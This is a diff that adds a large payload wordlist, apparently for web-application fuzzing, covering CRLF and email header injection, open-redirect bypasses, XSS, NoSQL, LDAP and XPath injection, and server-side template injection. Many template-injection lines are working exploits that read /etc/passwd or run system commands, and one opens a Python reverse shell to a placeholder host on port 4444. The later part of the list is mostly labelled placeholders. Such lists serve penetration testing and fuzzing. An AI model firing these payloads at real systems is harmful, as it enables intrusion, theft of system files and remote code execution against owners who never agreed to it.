@@ -70,6 +70,1455 @@ env=prod&env=dev
 param1=value1&param1=value2
 foo=bar&foo=baz
 cart=add&cart=remove
+%0AHeader-Test:BLATRUC
+%0A%20Header-Test:BLATRUC
+%20%0AHeader-Test:BLATRUC
+%23%OAHeader-Test:BLATRUC
+%E5%98%8A%E5%98%8DHeader-Test:BLATRUC
+%E5%98%8A%E5%98%8D%0AHeader-Test:BLATRUC
+%3F%0AHeader-Test:BLATRUC
+crlf%0AHeader-Test:BLATRUC
+crlf%0A%20Header-Test:BLATRUC
+crlf%20%0AHeader-Test:BLATRUC
+crlf%23%OAHeader-Test:BLATRUC
+crlf%E5%98%8A%E5%98%8DHeader-Test:BLATRUC
+crlf%E5%98%8A%E5%98%8D%0AHeader-Test:BLATRUC
+crlf%3F%0AHeader-Test:BLATRUC
+%0DHeader-Test:BLATRUC
+%0D%20Header-Test:BLATRUC
+%20%0DHeader-Test:BLATRUC
+%23%0DHeader-Test:BLATRUC
+%23%0AHeader-Test:BLATRUC
+%E5%98%8A%E5%98%8DHeader-Test:BLATRUC
+%E5%98%8A%E5%98%8D%0DHeader-Test:BLATRUC
+%3F%0DHeader-Test:BLATRUC
+crlf%0DHeader-Test:BLATRUC
+crlf%0D%20Header-Test:BLATRUC
+crlf%20%0DHeader-Test:BLATRUC
+crlf%23%0DHeader-Test:BLATRUC
+crlf%23%0AHeader-Test:BLATRUC
+crlf%E5%98%8A%E5%98%8DHeader-Test:BLATRUC
+crlf%E5%98%8A%E5%98%8D%0DHeader-Test:BLATRUC
+crlf%3F%0DHeader-Test:BLATRUC
+%0D%0AHeader-Test:BLATRUC
+%0D%0A%20Header-Test:BLATRUC
+%20%0D%0AHeader-Test:BLATRUC
+%23%0D%0AHeader-Test:BLATRUC
+\r\nHeader-Test:BLATRUC
+ \r\n Header-Test:BLATRUC
+\r\n Header-Test:BLATRUC
+%5cr%5cnHeader-Test:BLATRUC
+%E5%98%8A%E5%98%8DHeader-Test:BLATRUC
+%E5%98%8A%E5%98%8D%0D%0AHeader-Test:BLATRUC
+%3F%0D%0AHeader-Test:BLATRUC
+crlf%0D%0AHeader-Test:BLATRUC
+crlf%0D%0A%20Header-Test:BLATRUC
+crlf%20%0D%0AHeader-Test:BLATRUC
+crlf%23%0D%0AHeader-Test:BLATRUC
+crlf\r\nHeader-Test:BLATRUC
+crlf%5cr%5cnHeader-Test:BLATRUC
+crlf%E5%98%8A%E5%98%8DHeader-Test:BLATRUC
+crlf%E5%98%8A%E5%98%8D%0D%0AHeader-Test:BLATRUC
+crlf%3F%0D%0AHeader-Test:BLATRUC
+%0D%0A%09Header-Test:BLATRUC
+crlf%0D%0A%09Header-Test:BLATRUC
+%250AHeader-Test:BLATRUC
+/http://example.com
+/%5cexample.com
+/%2f%2fexample.com
+/example.com/%2f%2e%2e
+/http:/example.com
+/?url=http://example.com&next=http://example.com&redirect=http://example.com&redir=http://example.com&rurl=http://example.com
+/?url=//example.com&next=//example.com&redirect=//example.com&redir=//example.com&rurl=//example.com
+/?url=/\/example.com&next=/\/example.com&redirect=/\/example.com
+/redirect?url=http://example.com&next=http://example.com&redirect=http://example.com&redir=http://example.com&rurl=http://example.com
+/redirect?url=//example.com&next=//example.com&redirect=//example.com&redir=//example.com&rurl=//example.com
+/redirect?url=/\/example.com&next=/\/example.com&redirect=/\/example.com&redir=/\/example.com&rurl=/\/example.com
+/.example.com
+///\;@example.com
+///example.com/
+///example.com
+///example.com/%2f..
+/////example.com/
+/////example.com
+/%09/example.com
+/%2f%2fexample.com
+/%2f%5c%2f%67%6f%6f%67%6c%65%2e%63%6f%6d/
+/%5cexample.com
+/%68%74%74%70%3a%2f%2f%67%6f%6f%67%6c%65%2e%63%6f%6d
+/.example.com
+//%09/example.com
+//%5cexample.com
+///%09/example.com
+///%5cexample.com
+////%09/example.com
+////%5cexample.com
+/////example.com
+/////example.com/
+////\;@example.com
+////example.com/
+////example.com/%2e%2e
+////example.com/%2e%2e%2f
+////example.com/%2f%2e%2e
+////example.com/%2f..
+////example.com//
+///\;@example.com
+///example.com
+///example.com/
+///example.com/%2e%2e
+///example.com/%2e%2e%2f
+///example.com/%2f%2e%2e
+///example.com/%2f..
+///example.com//
+//example.com
+//example.com/
+//example.com/%2e%2e
+//example.com/%2e%2e%2f
+//example.com/%2f%2e%2e
+//example.com/%2f..
+//example.com//
+//google%00.com
+//google%E3%80%82com
+//https:///example.com/%2e%2e
+//https://example.com/%2e%2e%2f
+//https://example.com//
+/<>//example.com
+/?url=//example.com&next=//example.com&redirect=//example.com&redir=//example.com&rurl=//example.com&redirect_uri=//example.com
+/?url=/\/example.com&next=/\/example.com&redirect=/\/example.com&redirect_uri=/\/example.com
+/?url=Https://example.com&next=Https://example.com&redirect=Https://example.com&redir=Https://example.com&rurl=Https://example.com&redirect_uri=Https://example.com
+/\/\/example.com/
+/\/example.com/
+/example.com/%2f%2e%2e
+/http://%67%6f%6f%67%6c%65%2e%63%6f%6d
+/http://example.com
+/http:/example.com
+/https:/%5cexample.com/
+/https://%09/example.com
+/https://%5cexample.com
+/https:///example.com/%2e%2e
+/https:///example.com/%2f%2e%2e
+/https://example.com
+/https://example.com/
+/https://example.com/%2e%2e
+/https://example.com/%2e%2e%2f
+/https://example.com/%2f%2e%2e
+/https://example.com/%2f..
+/https://example.com//
+/https:example.com
+/redirect?url=//example.com&next=//example.com&redirect=//example.com&redir=//example.com&rurl=//example.com&redirect_uri=//example.com
+/redirect?url=/\/example.com&next=/\/example.com&redirect=/\/example.com&redir=/\/example.com&rurl=/\/example.com&redirect_uri=/\/example.com
+/redirect?url=Https://example.com&next=Https://example.com&redirect=Https://example.com&redir=Https://example.com&rurl=Https://example.com&redirect_uri=Https://example.com
+//google.com/%2f..
+//www.whitelisteddomain.tld@google.com/%2f..
+///google.com/%2f..
+///www.whitelisteddomain.tld@google.com/%2f..
+////google.com/%2f..
+////www.whitelisteddomain.tld@google.com/%2f..
+https://google.com/%2f..
+https://www.whitelisteddomain.tld@google.com/%2f..
+/https://google.com/%2f..
+/https://www.whitelisteddomain.tld@google.com/%2f..
+//www.google.com/%2f%2e%2e
+//www.whitelisteddomain.tld@www.google.com/%2f%2e%2e
+///www.google.com/%2f%2e%2e
+///www.whitelisteddomain.tld@www.google.com/%2f%2e%2e
+////www.google.com/%2f%2e%2e
+////www.whitelisteddomain.tld@www.google.com/%2f%2e%2e
+https://www.google.com/%2f%2e%2e
+https://www.whitelisteddomain.tld@www.google.com/%2f%2e%2e
+/https://www.google.com/%2f%2e%2e
+/https://www.whitelisteddomain.tld@www.google.com/%2f%2e%2e
+//google.com/
+//www.whitelisteddomain.tld@google.com/
+///google.com/
+///www.whitelisteddomain.tld@google.com/
+////google.com/
+////www.whitelisteddomain.tld@google.com/
+https://google.com/
+https://www.whitelisteddomain.tld@google.com/
+/https://google.com/
+/https://www.whitelisteddomain.tld@google.com/
+//google.com//
+//www.whitelisteddomain.tld@google.com//
+///google.com//
+///www.whitelisteddomain.tld@google.com//
+////google.com//
+////www.whitelisteddomain.tld@google.com//
+https://google.com//
+https://www.whitelisteddomain.tld@google.com//
+//https://google.com//
+//https://www.whitelisteddomain.tld@google.com//
+//www.google.com/%2e%2e%2f
+//www.whitelisteddomain.tld@www.google.com/%2e%2e%2f
+///www.google.com/%2e%2e%2f
+///www.whitelisteddomain.tld@www.google.com/%2e%2e%2f
+////www.google.com/%2e%2e%2f
+////www.whitelisteddomain.tld@www.google.com/%2e%2e%2f
+https://www.google.com/%2e%2e%2f
+https://www.whitelisteddomain.tld@www.google.com/%2e%2e%2f
+//https://www.google.com/%2e%2e%2f
+//https://www.whitelisteddomain.tld@www.google.com/%2e%2e%2f
+///www.google.com/%2e%2e
+///www.whitelisteddomain.tld@www.google.com/%2e%2e
+////www.google.com/%2e%2e
+////www.whitelisteddomain.tld@www.google.com/%2e%2e
+https:///www.google.com/%2e%2e
+https:///www.whitelisteddomain.tld@www.google.com/%2e%2e
+//https:///www.google.com/%2e%2e
+//www.whitelisteddomain.tld@https:///www.google.com/%2e%2e
+/https://www.google.com/%2e%2e
+/https://www.whitelisteddomain.tld@www.google.com/%2e%2e
+///www.google.com/%2f%2e%2e
+///www.whitelisteddomain.tld@www.google.com/%2f%2e%2e
+////www.google.com/%2f%2e%2e
+////www.whitelisteddomain.tld@www.google.com/%2f%2e%2e
+https:///www.google.com/%2f%2e%2e
+https:///www.whitelisteddomain.tld@www.google.com/%2f%2e%2e
+/https://www.google.com/%2f%2e%2e
+/https://www.whitelisteddomain.tld@www.google.com/%2f%2e%2e
+/https:///www.google.com/%2f%2e%2e
+/https:///www.whitelisteddomain.tld@www.google.com/%2f%2e%2e
+/%09/google.com
+/%09/www.whitelisteddomain.tld@google.com
+//%09/google.com
+//%09/www.whitelisteddomain.tld@google.com
+///%09/google.com
+///%09/www.whitelisteddomain.tld@google.com
+////%09/google.com
+////%09/www.whitelisteddomain.tld@google.com
+https://%09/google.com
+https://%09/www.whitelisteddomain.tld@google.com
+/%5cgoogle.com
+/%5cwww.whitelisteddomain.tld@google.com
+//%5cgoogle.com
+//%5cwww.whitelisteddomain.tld@google.com
+///%5cgoogle.com
+///%5cwww.whitelisteddomain.tld@google.com
+////%5cgoogle.com
+////%5cwww.whitelisteddomain.tld@google.com
+https://%5cgoogle.com
+https://%5cwww.whitelisteddomain.tld@google.com
+/https://%5cgoogle.com
+/https://%5cwww.whitelisteddomain.tld@google.com
+https://google.com
+https://www.whitelisteddomain.tld@google.com
+javascript:alert(1);
+javascript:alert(1)
+//javascript:alert(1);
+/javascript:alert(1);
+//javascript:alert(1)
+/javascript:alert(1)
+/%5cjavascript:alert(1);
+/%5cjavascript:alert(1)
+//%5cjavascript:alert(1);
+//%5cjavascript:alert(1)
+/%09/javascript:alert(1);
+/%09/javascript:alert(1)
+java%0d%0ascript%0d%0a:alert(0)
+//google.com
+https:google.com
+//google%E3%80%82com
+\/\/google.com/
+/\/google.com/
+//google%00.com
+https://www.whitelisteddomain.tld/https://www.google.com/
+";alert(0);//
+javascript://www.whitelisteddomain.tld?%a0alert%281%29
+http://0xd8.0x3a.0xd6.0xce
+http://www.whitelisteddomain.tld@0xd8.0x3a.0xd6.0xce
+http://3H6k7lIAiqjfNeN@0xd8.0x3a.0xd6.0xce
+http://XY>.7d8T\205pZM@0xd8.0x3a.0xd6.0xce
+http://0xd83ad6ce
+http://www.whitelisteddomain.tld@0xd83ad6ce
+http://3H6k7lIAiqjfNeN@0xd83ad6ce
+http://XY>.7d8T\205pZM@0xd83ad6ce
+http://3627734734
+http://www.whitelisteddomain.tld@3627734734
+http://3H6k7lIAiqjfNeN@3627734734
+http://XY>.7d8T\205pZM@3627734734
+http://472.314.470.462
+http://www.whitelisteddomain.tld@472.314.470.462
+http://3H6k7lIAiqjfNeN@472.314.470.462
+http://XY>.7d8T\205pZM@472.314.470.462
+http://0330.072.0326.0316
+http://www.whitelisteddomain.tld@0330.072.0326.0316
+http://3H6k7lIAiqjfNeN@0330.072.0326.0316
+http://XY>.7d8T\205pZM@0330.072.0326.0316
+http://00330.00072.0000326.00000316
+http://www.whitelisteddomain.tld@00330.00072.0000326.00000316
+http://3H6k7lIAiqjfNeN@00330.00072.0000326.00000316
+http://XY>.7d8T\205pZM@00330.00072.0000326.00000316
+http://[::216.58.214.206]
+http://www.whitelisteddomain.tld@[::216.58.214.206]
+http://3H6k7lIAiqjfNeN@[::216.58.214.206]
+http://XY>.7d8T\205pZM@[::216.58.214.206]
+http://[::ffff:216.58.214.206]
+http://www.whitelisteddomain.tld@[::ffff:216.58.214.206]
+http://3H6k7lIAiqjfNeN@[::ffff:216.58.214.206]
+http://XY>.7d8T\205pZM@[::ffff:216.58.214.206]
+http://0xd8.072.54990
+http://www.whitelisteddomain.tld@0xd8.072.54990
+http://3H6k7lIAiqjfNeN@0xd8.072.54990
+http://XY>.7d8T\205pZM@0xd8.072.54990
+http://0xd8.3856078
+http://www.whitelisteddomain.tld@0xd8.3856078
+http://3H6k7lIAiqjfNeN@0xd8.3856078
+http://XY>.7d8T\205pZM@0xd8.3856078
+http://00330.3856078
+http://www.whitelisteddomain.tld@00330.3856078
+http://3H6k7lIAiqjfNeN@00330.3856078
+http://XY>.7d8T\205pZM@00330.3856078
+http://00330.0x3a.54990
+http://www.whitelisteddomain.tld@00330.0x3a.54990
+http://3H6k7lIAiqjfNeN@00330.0x3a.54990
+http://XY>.7d8T\205pZM@00330.0x3a.54990
+http:0xd8.0x3a.0xd6.0xce
+http:www.whitelisteddomain.tld@0xd8.0x3a.0xd6.0xce
+http:3H6k7lIAiqjfNeN@0xd8.0x3a.0xd6.0xce
+http:XY>.7d8T\205pZM@0xd8.0x3a.0xd6.0xce
+http:0xd83ad6ce
+http:www.whitelisteddomain.tld@0xd83ad6ce
+http:3H6k7lIAiqjfNeN@0xd83ad6ce
+http:XY>.7d8T\205pZM@0xd83ad6ce
+http:3627734734
+http:www.whitelisteddomain.tld@3627734734
+http:3H6k7lIAiqjfNeN@3627734734
+http:XY>.7d8T\205pZM@3627734734
+http:472.314.470.462
+http:www.whitelisteddomain.tld@472.314.470.462
+http:3H6k7lIAiqjfNeN@472.314.470.462
+http:XY>.7d8T\205pZM@472.314.470.462
+http:0330.072.0326.0316
+http:www.whitelisteddomain.tld@0330.072.0326.0316
+http:3H6k7lIAiqjfNeN@0330.072.0326.0316
+http:XY>.7d8T\205pZM@0330.072.0326.0316
+http:00330.00072.0000326.00000316
+http:www.whitelisteddomain.tld@00330.00072.0000326.00000316
+http:3H6k7lIAiqjfNeN@00330.00072.0000326.00000316
+http:XY>.7d8T\205pZM@00330.00072.0000326.00000316
+http:[::216.58.214.206]
+http:www.whitelisteddomain.tld@[::216.58.214.206]
+http:3H6k7lIAiqjfNeN@[::216.58.214.206]
+http:XY>.7d8T\205pZM@[::216.58.214.206]
+http:[::ffff:216.58.214.206]
+http:www.whitelisteddomain.tld@[::ffff:216.58.214.206]
+http:3H6k7lIAiqjfNeN@[::ffff:216.58.214.206]
+http:XY>.7d8T\205pZM@[::ffff:216.58.214.206]
+http:0xd8.072.54990
+http:www.whitelisteddomain.tld@0xd8.072.54990
+http:3H6k7lIAiqjfNeN@0xd8.072.54990
+http:XY>.7d8T\205pZM@0xd8.072.54990
+http:0xd8.3856078
+http:www.whitelisteddomain.tld@0xd8.3856078
+http:3H6k7lIAiqjfNeN@0xd8.3856078
+http:XY>.7d8T\205pZM@0xd8.3856078
+http:00330.3856078
+http:www.whitelisteddomain.tld@00330.3856078
+http:3H6k7lIAiqjfNeN@00330.3856078
+http:XY>.7d8T\205pZM@00330.3856078
+http:00330.0x3a.54990
+http:www.whitelisteddomain.tld@00330.0x3a.54990
+http:3H6k7lIAiqjfNeN@00330.0x3a.54990
+http:XY>.7d8T\205pZM@00330.0x3a.54990
+〱google.com
+〵google.com
+ゝgoogle.com
+ーgoogle.com
+ｰgoogle.com
+/〱google.com
+/〵google.com
+/ゝgoogle.com
+"}
+"'
+{"key":"value"
+{"key":"value"}
+{key:"value"}
+{"name": "Alice", "role": "user"}
+{"name": "Alice", "role": "admin"}
+{"name":"", "empty":""}
+{"long":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"}
+{"unicode":"நண்பர்"}
+{"escape":"Line1\nLine2\tTabbed"}
+["a","b","c"]
+["a","b",{"x":"y"}]
+[],{}
+{"duplicate":"first","duplicate":"second"}
+{"number": 999999999999999999999}
+{"number": 0e123456}
+{"number": -2147483649}
+{"float": 1.7976931348623157e+308}
+{"boolean": true}
+{"boolean": false}
+{"nullable": null}
+{"nested":{"a":{"b":{"c":{"d":{"e":"deep"}}}}}}
+{"array_of_arrays":[[["x"]]]}
+{"malformed_array":[1,2,3,]}
+{"trailing_comma_obj":{"a":1,}}
+{"weird_key": {"@id":"123"}}
+{"sql_like":"SELECT * FROM users WHERE id=1"}
+{"script_like":"<script>alert(1)</script>"}
+{"json_string":"{\"inner\":\"value\"}"}
+{"quoted_number":"0123"}
+{"leading_zero_number": 0123}
+{"big_int_as_string":"18446744073709551616"}
+{"percent":"100%"}
+{"url":"http://example.com/?q=test&x=1"}
+{"base64":"SGVsbG8gd29ybGQ="}
+{"binary_like":"\u0000\u0001\u0002"}
+{"control_chars":"\b\f\n\r\t"}
+{"whitespace_key": {"   ":"space"}}
+{"very_deep_nesting": {"l1":{"l2":{"l3":{"l4":{"l5":{"l6":"x"}}}}}}}
+{"empty_object": {}}
+{"empty_array": []}
+{"mixed_types":[1,"two",null,true,{"x":1}]}
+{"leading_minus_zero": -0}
+{"scientific_neg": 6.022e23}
+{"big_negative": -9.223372036854776e+18}
+{"special_chars_key":"!@#$%^&*()_+-=[]{};':,./<>?"}
+{"proto_like":"__proto__"}
+{"constructor_like":"constructor"}
+{{2*2}}[[3*3]]
+{{3*3}}
+{{3*'3'}}
+<%= 3 * 3 %>
+${6*6}
+${{3*3}}
+@(6+5)
+#{3*3}
+#{ 3 * 3 }
+*{7*7}
+{{dump(app)}}
+{{app.request.server.all|join(',')}}
+{{config.items()}}
+{{ [].class.base.subclasses() }}
+{{''.class.mro()[1].subclasses()}}
+{{ ''.__class__.__mro__[2].__subclasses__() }}
+{{''.__class__.__base__.__subclasses__()[227]('cat /etc/passwd', shell=True, stdout=-1).communicate()}}
+{% for key, value in config.iteritems() %}<dt>{{ key|e }}</dt><dd>{{ value|e }}</dd>{% endfor %}
+{{'a'.toUpperCase()}} 
+{{ request }}
+{{self}}
+<%= File.open('/etc/passwd').read %>
+<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
+[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
+${"freemarker.template.utility.Execute"?new()("id")}
+{{app.request.query.filter(0,0,1024,{'options':'system'})}}
+{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
+{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/etc/passwd").read() }}
+{{''.__class__.mro()[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate()[0].strip()}}
+{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
+{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}
+{$smarty.version}
+{php}echo `id`;{/php}
+{{['id']|filter('system')}}
+{{['cat\x20/etc/passwd']|filter('system')}}
+{{['cat$IFS/etc/passwd']|filter('system')}}
+{{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}
+{{request|attr(["_"*2,"class","_"*2]|join)}}
+{{request|attr(["__","class","__"]|join)}}
+{{request|attr("__class__")}}
+{{request.__class__}}
+{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
+{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('xxx')\")}}
+{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}
+{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"netstat\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
+{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
+{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"/etc/passwd\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
+true, $where: '1 == 1'
+, $where: '1 == 1'
+$where: '1 == 1'
+', $where: '1 == 1
+1, $where: '1 == 1'
+{ $ne: 1 }
+', $or: [ {}, { 'a':'a
+' } ], $comment:'successful MongoDB injection'
+db.injection.insert({success:1});
+db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1
+|| 1==1
+|| 1==1//
+|| 1==1%00
+*
+*
+*)
+(
+))
+((
+*)
+*(
+)*
+*))
+*))(
+(|(uid=*))
+(|(cn=*))
+(|(mail=*))
+(|(uid=*)(cn=*))
+(&(uid=*)(objectClass=*))
+(&(cn=*)(mail=*))
+(|(uid=*)(uid=admin))
+(uid=*)
+(cn=*)
+(mail=*)
+(&(uid=*)(password=*))
+(uid=admin*)
+(cn=admin*)
+(mail=admin*)
+*)(uid=*)
+*)(cn=*)
+'
+"
+'' or '1'='1'
+"\" or \"1\"=\"1\"
+' or 1=1 or 'a'='a
+" or 1=1 or "a"="a"
+' or true() = true()
+" or true() = true()'
+' or false() = false()
+" or false() = false()'
+' or name()="node"
+" or name()="node"'
+' or contains(.,"admin")
+" or contains(.,"admin")'
+' or contains(@*, "admin")
+" or contains(@*, "admin")'
+' or starts-with(.,"adm")
+" or starts-with(.,"adm")'
+' or substring(.,1,1)='a'
+" or substring(.,1,1)="a"'
+') or ('1'='1
+") or ("1"="1"
+') or (true())
+") or (true())
+') or (false())
+") or (false())
+' or . = 'admin'
+" or . = "admin"'
+' or text() = 'admin'
+" or text() = "admin"'
+') or count(//*)>0 or ('a'='a
+") or count(//*)>0 or ("a"="a"
+ /*/text()
+ local-name(/*)
+ //user/*
+ //user[@id='1']
+ //user[starts-with(name(),'adm')]
+ //user[contains(.,'test')]
+ //user | //admin
+ //*[name()='password']
+ //user[position()=1]
+ //user[position()>1]
+ //user[not(@disabled)]
+ //user[@role='admin']
+ //user[@role='admin' or '1'='1']
+ //user[@role='admin' or 1=1]
+ //user[@id=''] | //user
+ //user[@id='' or true()]
+ //user[.=''] | //user
+ //user[.='' or 'a'='a']
+ //*[(1=1)]
+ //*[(false())]
+ //user/text()
+ //user/..
+ //user/child::password
+ //user/attribute::id
+ //user[contains(name(), 'ad')]
+ //user[translate(., 'ABC','abc')='admin']
+ //*[.='admin' or .='root']
+ //*[.='admin' or 1=1]
+' or normalize-space(./text())='admin'
+" or normalize-space(./text())="admin"
+' or number(1) = number(1)
+" or number(1)=number(1)"
+') or string-length(//user)>0 or ('a'='a
+") or string-length(//user)>0 or ("a"="a"
+ //user[. = concat('ad','min')]
+ //*[contains(concat(' ',@class,' '),' admin ')]
+ //user[. = '' or 'x'='x']
+ //user[.='' or contains(.,'x')]
+ //user[@username='' or starts-with(@username,'a')]
+ //*[name()='user' and contains(.,'test')]
+' or '1'='1' and 'a'='a
+" or "1"="1" and "a"="a"
+' or boolean(/) = true()
+" or boolean(/)=true()"
+') or /*/*/*/*/* or ('1'='1
+") or /*/*/*/*/* or ("1"="1"
+') or //*[contains(.,'')]
+") or //*[contains(.,"")]
+') or //@* or ('1'='1
+") or //@* or ("1"="1"
+') or name(//user)='user' or ('a'='a
+") or name(//user)="user" or ("a"="a"
+ //*[starts-with(text(), 'adm') or contains(.,'test')]
+ //user[.=' ' or .='
+']
+\r\nBcc: victim@example.com
+%0d%0aBcc:%20victim@example.com
+\nCC: admin@example.com
+\r\nCc: admin@example.com
+Subject: Test\r\nBcc: attacker@example.com
+From: "John Doe"\r\nBCC: victim@example.com
+To: user@example.com\r\nReply-To: attacker@example.com
+Alice\r\nCc: hidden@example.com
+Bob\nCc: hidden@example.com
+Name: Test\r\nContent-Type: text/html
+Name: Test%0d%0aContent-Type:%20text/html
+Subject: Hello\r\nSubject: Overwrite
+Subject: Hello\nSubject: Overwrite
+\r\n\r\n.\r\n
+.\r\nQUIT\r\n
+.\r\nRCPT TO:<victim@example.com>\r\n
+\r\nReceived: from evil.example.com
+\r\nX-Spam-Status: Yes
+\r\nX-Mailer: FakeMailer\r\n
+\r\nX-Forwarded-For: 127.0.0.1
+\r\nReturn-Path: <attacker@example.com>
+\r\nReply-To: attacker@example.com
+\r\nContent-Transfer-Encoding: base64
+\r\nContent-Disposition: attachment; filename="file.txt"
+--boundary\r\nContent-Type: text/plain\r\n\r\n
+--boundary\r\nContent-Type: text/html\r\n\r\n
+--boundary\r\nContent-Type: application/octet-stream\r\n\r\n
+--boundary\r\nContent-Disposition: attachment; filename="poc.txt"\r\n\r\n
+--boundary\r\nContent-Type: text/plain\r\nContent-Transfer-Encoding: base64\r\n\r\n
+Subject: A\r\n\r\nBcc: hidden@example.com
+From: test@example.com\r\nX-Test: injected
+To: user@example.com\r\nX-Admin: true
+From: "x\r\nBCC: victim@example.com"
+From: "x%0aBCC: victim@example.com"
+Subject: test\r\nX-Injected: 1
+Subject: test%0d%0aX-Injected: 1
+User-Name: john\r\nX-Auth-Token: abc
+Display-Name: "Eve\nBcc: victim@example.com"
+Display-Name: "Eve%0d%0aBcc:%20victim@example.com"
+Message-ID: <1234>\r\nX-Note: injected
+X-Header: value\r\nX-Extra: extra
+X-Header: value%0d%0aX-Extra: extra
+Content-Type: text/plain; charset="utf-8"\r\n\r\n
+Content-Type: text/plain\r\nContent-Length: 9999999999
+Content-Length: 999999999999999999999
+Subject: verylongaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+Subject: %00Injected%00
+Subject: test\0Injected
+From: attacker@example.com\r\nCc: victim1@example.com, victim2@example.com
+To: user@example.com\r\nBcc: victim1@example.com,victim2@example.com
+From: "A\r\nCc: victim@example.com\r\n"
+'"; // placeholder:CMD_ECHO
+"'; // placeholder:CMD_ECHO
+'; echo 'INJECT' //
+"; echo "INJECT" //
+`ECHO_INJECT`
+$(ECHO_INJECT)
+${ECHO_INJECT}
+"; exec("CMD_ECHO") //
+'); exec('CMD_ECHO') //
+" or 1==1 or "a"=="a
+' or 1==1 or 'a'='a
+"; return this; //
+'); return this; //
+<!-- injected-comment -->
+/* injected-comment */
+*/ DROP // (test-comment-break)
+'/*'
+"/*"
+}); // closing JS object
+}); alert('INJECT') // (safe placeholder)
+'); alert("INJECT") // (safe placeholder)
+" onmouseover="INJECT()" //
+'><img src=x onerror=INJECT()> 
+"><svg onload=INJECT()> 
+${{INJECT}}     /* template placeholder */
+{{INJECT}}      /* template placeholder */
+%{INJECT}       /* ruby/formatter placeholder */
+%x{INJECT}      /* format placeholder */
+%r{INJECT}      /* regex placeholder */
+`$(INJECT)`     /* nested */
+"; DROP TABLE test; --    /* harmless replaced: DROP -> DROP_TEST */
+' OR 'x'='x' --
+' OR 'x'='x' /*
+" OR "x"="x" --
+) OR (1=1) --
+') OR ('1'='1
+") OR ("1"="1
+`'`"\/\n\r\t\b\f\x00   /* control chars */
+'"; var a = "INJECT"; // 
+"'; var a = 'INJECT'; // 
+'); var a = 1; //
+"; var a = 1; //
+new Function("return 'INJECT'")()
+eval("/*INJECT*/")
+eval('/*INJECT*/')
+setTimeout("INJECT", 0)
+setInterval("INJECT", 1000)
+Process.start("INJECT") /* placeholder */
+Runtime.getRuntime().exec("CMD_ECHO") /* placeholder */
+System.exec("CMD_ECHO") /* placeholder */
+require('child_process').exec("CMD_ECHO") /* placeholder */
+import os; os.system("CMD_ECHO")  # placeholder
+__import__('os').system('CMD_ECHO')  # placeholder
+pickle.loads("INJECTED_PICKLE")  # placeholder for deserialization test
+Object.create(null).__proto__ = { test: "INJ" }  /* prototype-like */
+{"__proto__": {"injected": "1"}}  /* JSON prototype-check */
+(new URL('http://example.com/?q=INJECT')).searchParams.get('q')
+../../../../etc/passwd  /* path-traversal-like string (safe) */
+..\\..\\..\\windows\\system32  /* windows path-traversal-like (safe) */
+%2e%2e%2f%2e%2e%2f  /* url-encoded ../.. */
+%00%2f%00%00  /* null byte encodings */
+\x00\xff\xfe\x7f  /* raw bytes placeholder */
+long_string_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+' OR EXISTS(SELECT * FROM users) --
+" OR EXISTS(SELECT * FROM users) --
+--\nContent-Type: text/html\n\n<p>INJECT</p>
+\r\n\r\nBcc: attacker@example.com\r\n  /* CRLF injection style */
+%0d%0aBcc:%20attacker@example.com
+Name: John\r\nCc: attacker@example.com
+" + (function(){return "INJECT"})() + "
+' + (function(){return 'INJECT'})() + '
+${(function(){return "INJECT"})()}
+${userInput} /* interpolation placeholder */
+`node -e "console.log('INJECT')"`  /* safe placeholder */
+' OR SLEEP(0) --   /* timing placeholder */
+" OR BENCHMARK(1,MD5('x')) --  /* safe placeholder */
+' OR ASCII(SUBSTRING((SELECT user),1,1))>0 --
+" or substr(password,1,1)='a'
+); DROP_SCHEMA(); /* placeholder */
+); /* comment injection */
+%3Cscript%3Ealert(1)%3C/script%3E  /* url-encoded XSS test */
+<iframe srcdoc="INJECT"></iframe>
+" /> <script>INJECT()</script>
+`$(python -c 'print("INJECT")')`  /* placeholder */
+${jndi:ldap://example.com/a}  /* jndi-like placeholder (do not contact) */
+${jndi:ldap://INJECT}  /* jndi-like placeholder */
+${env.INJECT}  /* env interpolation placeholder */
+${process.env.PATH}  /* env placeholder */
+#{7*7}  /* ruby/erb-like placeholder */
